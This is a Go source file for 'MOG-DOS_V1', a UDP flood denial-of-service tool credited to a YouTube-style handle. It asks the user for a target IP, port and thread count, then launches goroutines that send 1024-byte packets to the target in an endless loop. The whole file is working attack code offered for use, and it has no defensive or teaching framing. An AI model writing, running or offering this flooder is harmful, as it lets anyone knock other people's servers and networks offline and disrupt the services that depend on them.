// MOG-DOS_V1 IN GOLANG! Made by MOG-Developing || @misterofgames_yt

package main

import (
	"fmt"
	"net"
	"runtime"
	"strconv"
	"sync"
)

func flood(targetIP string, targetPort int, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
	conn, _ := net.Dial("udp", addr)
	data := make([]byte, 1024)
	for i := 0; i < 1024; i++ {
		data[i] = 'X'
	}
	for {
		conn.Write(data)
	}
}

func main() {
	fmt.Print("Enter target IP: ")
	var targetIP string
	fmt.Scanln(&targetIP)
	fmt.Print("Enter target port: ")
	var portStr string
	fmt.Scanln(&portStr)
	targetPort, _ := strconv.Atoi(portStr)
	fmt.Print("Enter threads: ")
	var threadsStr string
	fmt.Scanln(&threadsStr)
	threads, _ := strconv.Atoi(threadsStr)

	runtime.GOMAXPROCS(runtime.NumCPU())
	var wg sync.WaitGroup
	wg.Add(threads)
	for i := 0; i < threads; i++ {
		go flood(targetIP, targetPort, &wg)
		fmt.Printf("Thread %d started\n", i+1)
	}
	wg.Wait()
}
